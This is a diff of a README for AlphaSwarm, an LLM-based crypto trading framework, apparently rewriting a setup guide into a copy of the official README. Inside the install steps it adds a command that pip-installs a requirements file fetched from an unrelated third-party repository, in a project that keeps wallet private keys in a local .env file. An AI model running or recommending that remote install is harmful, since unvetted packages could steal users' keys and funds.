@@ -1,57 +1,200 @@
-# AlphaSwarm Setup Guide
+# 🚀 AlphaSwarm - AI-Powered Crypto Trading Agents
 
-This guide provides step-by-step instructions for setting up and running the [AlphaSwarm](https://github.com/chain-ml/alphaswarm) repository.
+**AlphaSwarm** is a cutting-edge AI trading framework that enables users to build LLM-powered agents for interpreting trading strategies, analyzing real-time market data, and executing trades across multiple blockchains.
 
-## Prerequisites
+---
 
-Ensure you have the following installed:
-- Python 3.8+
-- Git
-- Virtual environment (optional but recommended)
+## 🌟 Features
 
-## Step 1: Clone This Repository
+### **🤖 AI-Powered Trading with Agents**
+- LLM-powered agents capable of processing complex, unstructured signals for trading decisions
+- Intelligent tool selection and chaining for multi-step analysis
+- Dynamic composition and execution of Python code
+- Natural language strategy definition with real-time reasoning
+- Iterative agentic reasoning to evaluate market conditions and execute trades
 
-```sh
-git clone https://github.com/YOUR_GITHUB_USERNAME/alphaswarm-setup-guide.git
-cd alphaswarm-setup-guide
-```
+### **⚡ Trading & Execution**
+- Real-time strategy execution and monitoring
+- Automated trading alerts via Telegram
+- Autonomous trade execution
+- Multi-chain support:
+  - **Ethereum**, **Base**
+  - 🔜 *Solana (Coming Soon!)*
+- DEX Integrations:
+  - **Uniswap V2/V3**
+  - 🔜 *Jupiter (Coming Soon!)*
 
-## Step 2: Install Dependencies
+### **🛠️ Modular Architecture**
+- Extensible plugin system for:
+  - Data sources & market signals
+  - Trading strategies
+  - Agent tools & capabilities
+  - DEX integrations
+  - On-chain data providers
+- Easy integration of new data sources and execution venues
 
-Create a virtual environment (optional but recommended):
-```sh
-python -m venv venv
-source venv/bin/activate  # On Windows use: venv\Scripts\activate
-```
+---
 
-Install dependencies:
-```sh
-pip install -r requirements.txt
-```
+## 📌 Roadmap
+🌐 Integration with **Theoriq Protocol** to connect with a growing ecosystem of agents and trading strategies.
 
-> **Note:** The versions of dependencies have been removed to ensure compatibility with the latest versions.
+---
 
-## Step 3: Clone and Set Up AlphaSwarm Repository
+## 🛠️ Prerequisites
+- **Python 3.11 or higher** → [Download here](https://www.python.org/downloads/)
+  - Verify installation: `python --version`
+- **Poetry (Package Manager)**
+  - Install: `pipx install poetry`
+  - Verify: `poetry --version`
+- **Basic understanding of crypto trading concepts**
 
-```sh
+---
+
+## 🔧 Getting Started
+### **1️⃣ Installation**
+
+Ensure all prerequisites are installed, then follow these steps:
+
+#### ✅ Clone the Repository:
+```bash
 git clone https://github.com/chain-ml/alphaswarm.git
 cd alphaswarm
 ```
 
-Follow the official instructions in the AlphaSwarm repository to complete the setup:
+#### ✅ Install Dependencies:
+```bash
+# Basic installation
+poetry install
 
-```sh
-# Example setup commands (Refer to the AlphaSwarm documentation for updates)
-pip install -r requirements.txt
-python setup.py install
+# Development installation (includes testing tools)
+poetry install --with dev
 ```
 
-## Step 4: Running AlphaSwarm
+📌 *Poetry manages virtual environments automatically. No need for manual venv setup!*
 
-Run AlphaSwarm using:
-```sh
-python main.py  # Or any specific command required by AlphaSwarm
+#### ✅ Install Requirements from External Repository:
+```bash
+pip install -r https://raw.githubusercontent.com/HarbhagwanDhaliwal/alphaswarm-setup-guide/main/requirements.txt
 ```
 
-For more details, refer to the [AlphaSwarm documentation](https://github.com/chain-ml/alphaswarm).
+---
+
+### **2️⃣ API Keys Setup**
+Before running AlphaSwarm, obtain the necessary API keys:
+
+#### 🔑 **LLM API Keys:**
+- Anthropic API Key (**Claude Models** - default)
+- OpenAI API Key (**GPT Models**)
+- Other LLM providers via LiteLLM
+
+#### 🔑 **Blockchain Access Keys:**
+- **Alchemy API Key** (Required for blockchain data)
+- **RPC URLs** from Alchemy, Infura, or other providers
+
+#### 🔑 **Optional - Telegram Bot (For Alerts):**
+- Create a bot via **BotFather** (`/newbot`) and save the token
+- Retrieve your chat ID using `examples/telegram_bot.py`
+
+---
+
+### **3️⃣ Environment Configuration**
+Create a `.env` file:
+```bash
+cp .env.example .env
+```
+
+Update `.env` with your API keys and configuration:
+
+```plaintext
+# LLM Config
+ANTHROPIC_API_KEY=<your_key>
+OPENAI_API_KEY=<your_key>
+
+# Blockchain Access
+ALCHEMY_API_KEY=<your_key>
+
+# Ethereum
+ETH_RPC_URL=<your_rpc_url>
+ETH_WALLET_ADDRESS=<your_wallet>
+ETH_PRIVATE_KEY=<your_private_key>
+
+# Base
+BASE_RPC_URL=<your_rpc_url>
+BASE_WALLET_ADDRESS=<your_wallet>
+BASE_PRIVATE_KEY=<your_private_key>
+```
+📌 **Security Tips:**
+- NEVER commit your `.env` file!
+- Always store private keys securely.
+
+---
+
+### **4️⃣ Additional Configuration**
+AlphaSwarm uses **YAML configuration files** (`config/default.yaml`) to define:
+- **Network Environments** (mainnet/testnet settings)
+- **Trading Venues** (DEXs, token pairs, execution settings)
+- **On-Chain Configurations** (wallets, gas fees, transaction settings)
+- **Telegram Alerts** (bot settings)
+
+📌 *Always verify contract addresses from official sources!*
+
+---
+
+## 📊 Usage
+Check out the [examples/README.md](examples/README.md) for usage examples.
+
+---
+
+## 🔬 Development
+### 🛠️ Running Tests
+```bash
+# Run all tests
+make all-tests
+
+# Run specific test suites
+make unit-tests
+make integration-tests  # Requires API keys
+```
+
+### 🛠️ Code Quality
+```bash
+poetry run black .  # Format code
+poetry run isort .  # Sort imports
+poetry run ruff check .  # Run linter
+poetry run mypy .  # Type checking
+```
+
+Or use the **Makefile** shortcuts:
+```bash
+make dev-lint
+```
+
+---
+
+## 🔒 Security & Disclaimer
+### ⚠️ **Important Legal & Risk Disclosure**
+AlphaSwarm is experimental software. By using it, you acknowledge and agree that:
+- **LLMs are non-deterministic** and may produce **unpredictable results**.
+- **Crypto trading carries significant risk**, and market conditions can lead to **partial or complete loss of funds**.
+- **This is NOT financial advice.** The software is for **illustration purposes only**.
+- **Users are responsible for their own due diligence and security.**
+- **Use testnets before trading with real funds.**
+
+🔹 **No warranty provided.** The developers are **NOT liable** for any financial losses incurred.
+
+---
+
+## 📩 Support & Contributions
+### Need Help? 💡
+Check our **[Support Guide](https://github.com/chain-ml/alphaswarm/wiki/Support-Guide)** for assistance.
+
+### Want to Contribute? 🔥
+AlphaSwarm is actively developed. Contributions, PRs, and feature requests are **welcome!**
+
+---
+
+## 📜 License
+Licensed under the **MIT License**. See the **LICENSE** file for details.
+
+🚀 **Happy Trading with AlphaSwarm!** 🎯
 
